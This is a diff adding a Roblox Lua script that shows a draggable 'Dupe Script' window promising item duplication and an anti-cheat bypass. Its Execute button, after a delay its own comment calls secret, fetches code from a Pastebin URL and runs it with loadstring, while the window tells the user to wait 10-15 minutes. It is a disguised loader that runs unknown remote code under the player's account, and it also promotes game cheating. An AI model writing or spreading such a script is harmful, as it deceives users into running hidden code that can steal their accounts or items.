@@ -1,0 +1,97 @@
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DupeScriptGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainGui"
+mainFrame.Size = UDim2.new(0, 320, 0, 160)
+mainFrame.Position = UDim2.new(0.5, -160, 0.4, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 10)
+uicorner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Text = "Dupe Script"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+title.Size = UDim2.new(1, 0, 0, 35)
+title.BorderSizePixel = 0
+title.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 10)
+titleCorner.Parent = title
+
+local description = Instance.new("TextLabel")
+description.Text = "Execute this first. Wait 10-15 mins."
+description.Font = Enum.Font.Gotham
+description.TextSize = 14
+description.TextColor3 = Color3.fromRGB(200, 200, 200)
+description.BackgroundTransparency = 1
+description.Position = UDim2.new(0, 0, 0, 40)
+description.Size = UDim2.new(1, 0, 0, 25)
+description.Parent = mainFrame
+
+local executeButton = Instance.new("TextButton")
+executeButton.Text = "Execute"
+executeButton.Font = Enum.Font.GothamBold
+executeButton.TextSize = 18
+executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeButton.BackgroundColor3 = Color3.fromRGB(40, 120, 40)
+executeButton.Size = UDim2.new(0.8, 0, 0, 40)
+executeButton.Position = UDim2.new(0.1, 0, 1, -50)
+executeButton.Parent = mainFrame
+
+local execCorner = Instance.new("UICorner")
+execCorner.CornerRadius = UDim.new(0, 8)
+execCorner.Parent = executeButton
+
+local dragging, dragInput, dragStart, startPos
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+
+executeButton.MouseButton1Click:Connect(function()
+	executeButton.Text = "Starting..."
+	description.Text = "Wait 10-15 mins - Bypassing Anti Cheats."
+	task.wait(2) -- Executes after a 2-second delay (secretly)
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3TY0Gi6g"))()
+	end)
+	if success then
+		description.Text = "Executed successfully."
+	else
+		description.Text = "Execution failed."
+	end
+end)
